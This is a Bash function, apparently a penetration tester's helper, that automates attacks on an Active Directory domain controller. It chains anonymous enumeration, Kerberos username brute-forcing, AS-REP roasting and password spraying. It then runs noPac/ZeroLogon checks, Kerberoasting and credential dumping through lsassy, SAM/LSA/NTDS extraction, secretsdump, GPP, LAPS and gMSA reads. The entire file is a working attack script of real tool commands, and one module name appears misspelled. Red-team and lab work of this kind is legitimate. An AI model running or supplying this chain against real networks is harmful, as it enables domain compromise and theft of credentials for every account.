adscan(){

	#WORDLIST SPECIFICATION
	userlist=/usr/share/seclists/AD/UNAUTH/users.txt
	userlist_auth=/usr/share/seclists/AD/AUTH/users.txt

	passlist=/usr/share/seclists/AD/UNAUTH/passwords.txt

	dcip=$1
        dom_name=$(ntlm-info smb $dcip | grep 'DnsDomain' | awk '{print $2}')

	#PORT SPECIFICATION
	smb=445
	ldap=389

	mkdir ADSCAN_OUTPUT 2>/dev/null
	cd ADSCAN_OUTPUT

	read REPLY\?"INITIATE ANONYMOUS/GUEST ENUMERATION? (Y/N)"

	if [[ $REPLY =~ ^[Yy]$ ]]
	then
		echo -e "\n--------------SMB ENUMERATION--------------\n"
		crackmapexec smb $dcip -u "" -p "" --shares --pass-pol --disks --computers --groups --users --loggedon-users --sessions
        	crackmapexec smb $dcip -u guest -p "" --shares --pass-pol --disks --computers --groups --users --loggedon-users --sessions

        	echo -e "\n--------------RPC ENUMERATION--------------\n"
        	rpcclient -U "" -N $dcip -c dsroledominfo:srvinfo:enumdomains:querydominfo:getdompwinfo:enumdomusers:enumdomgroups:querydispinfo:enumprinters:netshareenumall
        	rpcclient -U "guest" -N $dcip -c dsroledominfo:srvinfo:enumdomains:querydominfo:getdompwinfo:enumdomusers:enumdomgroups:querydispinfo:enumprinters:netshareenumall
        	rpcdump.py $dcip
        	rpcinfo $dcip
        	samrdump.py $dcip

        	echo -e "\n--------------GPP PASSWORDS--------------\n"
        	cme smb $dcip -u "" -p "" -M gpp_password
        	cme smb $dcip -u guest -p "" -M gpp_password

		echo -e "\n--------------USERS ENUMERATION--------------\n"
		mkdir LDAP_DUMP 2>/dev/null
		ldeep ldap -s ldap://$dcip:$ldap -d $dom_name -a all LDAP_DUMP/out
		grep -iR 'sAMAccountName' -A 1 LDAP_DUMP/out_users_all.json 2>/dev/null
       		grep -iR 'description' -A 1 LDAP_DUMP/out_users_all.json 2>/dev/null

		windapsearch -d $dom_name --dc-ip $dcip -U | grep "@$dom_name" | awk '{print $2}' | awk -F"@" '{print $1}' > tmp
		sort -u tmp > sorted && mv sorted tmp
		if [ -s tmp ]
		then
			mv tmp $userlist_auth
			echo "Found Users"
			echo "------------------"
			cat $userlist_auth
		else
			echo "No Users Found" && rm tmp
		fi

        	cme ldap $dcip -u "" -p "" -M get-desc-users
        	cme ldap $dcip -u guest -p "" -M get-desc-users
	fi

	read REPLY\?"--------------INITIATE USER KERBRUTING? (Y/N)--------------"

        if [[ $REPLY =~ ^[Yy]$ ]]
        then
		echo -e "\nUSER BRUTING...\n"
		kerbrute userenum --dc $dcip -d $dom_name $userlist -o result
		cat result | grep "@$dom_name" | awk '{print $7}' | awk -F"@" '{print $1}' > brute_users && rm result
		cat brute_users >> $userlist_auth && sort -u $userlist_auth > tmp && mv tmp $userlist_auth && rm brute_users

		echo -e "\nFOUND USERS: \n"
		cat $userlist_auth
		echo ""
	fi

	read REPLY\?"--------------TRY AS-REP ROASTING ON FOUND USERNAMES? (Y/N)--------------"

        if [[ $REPLY =~ ^[Yy]$ ]]
        then
		echo -e "\nATTEMPTING UNAUTH/AS_REP-ROASTING...\n"
		GetNPUsers.py $dom_name/ -no-pass -usersfile $userlist_auth -dc-ip $dcip -format john
        fi

	read REPLY\?"--------------PASSWORD SPRAY THE NETWORK? (Y/N)--------------"
	if [[ $REPLY =~ ^[Yy]$ ]]
	then
		echo -e "\nBRUTEFORCING CREDENTIALS... \n"
		echo "TRYING USERNAMES AS PASSWORDS"
		crackmapexec smb $dcip -u $userlist_auth -p $userlist_auth --continue-on-success | grep "[+]" | awk '{print $6}'

		read REPLY\?"SPRAYING WITH PASSLIST? (Y/N)"
		if [[ $REPLY =~ ^[Yy]$ ]]
		then
			crackmapexec smb $dcip -u $userlist_auth -p $passlist --continue-on-success | grep "[+]" | awk '{print $6}'
		fi
	fi

	echo -e "\n<----------------AUTHENTICATED-ATTACKS----------------->\n"
	read REPLY\?"PERFORM AUTHENTICATED OPERATIONS? (Y/N)"
        if [[ $REPLY =~ ^[Yy]$ ]]
        then
		echo "Input Username:"
		read asrep_user
		echo "Input Password:"
		read asrep_pass

        	echo -e "\nNO-PAC / ZEROLOGON\n"
        	cme smb $dcip -u $asrep_user -p $asrep_pass -M nopac
        	cme smb $dcip -u $asrep_user -p $asrep_pass -M zerologo

		echo -e "\nSMB ENUMERATION\n"
        	cme smb $dcip -u $asrep_user -p $asrep_pass --shares --pass-pol --disks --computers --groups --users --loggedon-users --sessions
        	cme ldap $dcip -u $asrep_user -p $asrep_pass -M get-desc-users
        
        	echo -e "\nRPC ENUMERATION\n"
        	rpcclient -U "$dom_name/$asrep_user:$asrep_pass" $dcip -c dsroledominfo:srvinfo:enumdomains:querydominfo:getdompwinfo:enumdomusers:enumdomgroups:querydispinfo:enumprinters:netshareenumall

		echo -e "\nLDAP DUMPING\n"
		ldeep ldap -s ldap://$dcip:$ldap -d $dom_name -u $asrep_user -p $asrep_pass -a all LDAP_DUMP/out

		echo -e "\nSID LOOKUP\n"
		lookupsid.py $asrep_user:$asrep_pass@$dcip

		GetADUsers.py -all -dc-ip $dcip $dom_name/$asrep_user | awk '{print $1}' | tail -n +6 > $userlist_auth
		cat $userlist_auth

		echo -e "\nROASTING THE NETWORK \n"
        	cme ldap $dcip -u $asrep_user -p $asrep_pass -M asreproast
        	cme ldap $dcip -u $asrep_user -p $asrep_pass -M Kerberoasting

		echo -e "\nSPRAYING PASSWORD: '$asrep_pass' ON THE USERS \n"
		cme smb $dcip -u $userlist_auth -p $asrep_pass --continue-on-success | grep "[+]" | awk '{print $6}'
        
        	echo -e "\nCREDENTIAL DUMPING (GPP / LAPS / LSASS / GOPHER / DCSYNC / rGMSA)\n"
        	cme smb $dcip -u $asrep_user -p $asrep_pass -M lsassy
        	cme smb $dcip -u $asrep_user -p $asrep_pass --sam --lsa --ntds
        	cme smb $dcip -u $asrep_user -p $asrep_pass -M gpp_password
        	cme smb $dcip -u $asrep_user -p $asrep_pass -M gpp_autologin
        	cme smb $dcip -u $asrep_user -p $asrep_pass -M invoke-sessiongopher
        	cme smb $dcip -u $asrep_user -p $asrep_pass -M mimikatz_enum_vault_creds
        	grep -iR 'ms-mcs-admpwd' -C 2 LDAP_DUMP/* 2>/dev/null
		secretsdump.py $asrep_user:$asrep_pass@$dcip
		rGMSA.py -u $asrep_user -p $asrep_pass -d $dom_name -l ldap://$dcip:$ldap

		echo -e "\nACTIVE WINRM SESSIONS \n"
		cme winrm $dcip -u $userlist_auth -p $asrep_pass --continue-on-success

		echo ""
	cd ~
}
